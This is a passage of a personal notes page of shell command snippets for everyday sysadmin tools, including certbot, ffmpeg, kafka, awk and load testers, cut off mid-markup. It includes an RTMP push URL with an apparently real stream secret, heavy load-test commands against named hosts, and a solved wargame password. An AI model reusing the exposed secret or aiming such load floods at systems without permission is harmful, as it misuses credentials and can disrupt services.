style=\"color:#75715e\"\u003e# output: HELLO WORLD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 提取子字符串: `substr(string, start, length)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello world\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print substr($0, 1, 5)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: hello\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 全局替換字符串中的正則表達式匹配項: `gsub(regex, replacement, string)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 替換字符串中首次匹配的正則表達式: `sub(regex, replacement, string)`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello world\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{gsub(/world/, \u0026#34;everyone\u0026#34;); print $0}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: hello everyone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 將數字轉換為整數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3.14\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print int($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 返回平方根\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;99\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print sqrt($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 9.94987\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 指數和對數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print exp($0), log($0)}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# output: 7.38906 0.693147\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecaffeinate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 防止显示器关闭\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 保持系统不休眠\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -i\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 保持 30 分钟\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecaffeinate -t \u003cspan style=\"color:#ae81ff\"\u003e1800\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecertbot\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Install\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install certbot python3-certbot-nginx python3-certbot-dns-route53\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 1. Generating Wildcard Certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo certbot certonly --manual --preferred-challenges\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e### add txt record then press enter to continue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 2. Generating Wildcard Certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo certbot certonly -d example.com -d *.example.com --dns-route53 --agree-tos --server https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Automating Renewal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e * * \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e /usr/bin/certbot certonly --dns-route53 -d *.example.com --quiet --post-hook \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;systemctl reload nginx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecutycapt\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Capture website page as picture\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003exvfb-run --server-args\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-screen 0, 1024x768x24\u0026#34;\u003c/span\u003e cutycapt --url\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttps://www.google.com --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/google.png\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edmesg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo dmesg -T | grep -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;killed process\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# total-vm: 該程序分配的虛擬記憶體總量（含未實際使用）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# anon-rss: 匿名頁面 resident memory（實際佔用記憶體）→ 重點\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# file-rss: 映射檔案的 resident memory（如 shared libraries）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# shmem-rss: 共用記憶體的 resident memory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ednscontrol\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/common/files/creds.json\"\u003ecreds.json\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ecommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ednscontrol get-zones --format\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejs --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eexample.com.js r53 ROUTE53 example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ednscontrol get-zones --format\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejs --out\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eexample.com.js cloudflare CLOUDFLAREAPI example.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003effmpeg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Download sample video\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://www.sample-videos.com/video321/mp4/720/big_buck_bunny_720p_1mb.mp4 -O test.mp4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Push stream\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effmpeg -re -i test.mp4 -c copy -f flv \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rtmp://209357.push.tlivecloud.com/live/big_buck_bunny_720p_1mb?txSecret=a543b79d9a8c38ace5ce18eea2bd7721\u0026amp;txTime=687E4609\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ego\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego tool pprof -http\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e:8081 20250814_024534.heap\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ek6\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/common/files/k6.js\"\u003ek6.js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ecommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ek6 run k6.js\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ekafka\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list topics\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# all topics count\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekafka-topics.sh --bootstrap-server 127.0.0.1:9094 --list |wc -l\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ehey\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehey -n \u003cspan style=\"color:#ae81ff\"\u003e200000\u003c/span\u003e -c \u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e -h2 -z 30s https://a8-wss.hddv1.com/test\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenfortivpn\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# https://github.com/adrienverge/openfortivpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo openfortivpn ip:port --username\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ericky --pppd-use-peerdns\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenssl\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 自簽名證書，要把 ca.p7b 匯入 certmgr.msc 的受信任的根憑證授權單位，Chrome 才吃的到。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl crl2pkcs7 -nocrl -certfile ca.crt -out ca.p7b\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprlimit\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 更改 Max_open_files 遇到參數錯誤，原因為 CentOS6 與 CentOS7 指令不同\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# CentOS6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eps -ef | grep \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;publish/server/game_server\u0026#39;\u003c/span\u003e | egrep -v \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;grep|startall\u0026#39;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e echo -n \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Max open files=1024000:1024000\u0026#34;\u003c/span\u003e \u0026gt; /proc/$i/limits; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# CentOS7\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eps -ef | grep gateway | grep -v grep | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e prlimit --pid $i --nofile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1024000:1024000 ; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esiege\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esiege --time\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e3s --concurrent\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30000\u003c/span\u003e https://a8-h5.hddv1.com/index.html\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etr\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# cat krypton2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eYRIRY GJB CNFFJBEQ EBGGRA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# cat krypton2 | tr a-zA-Z n-za-mN-ZA-M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLEVEL TWO PASSWORD ROTTEN\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evegeta\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eattack\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vegeta attack -duration\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e100s -header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan 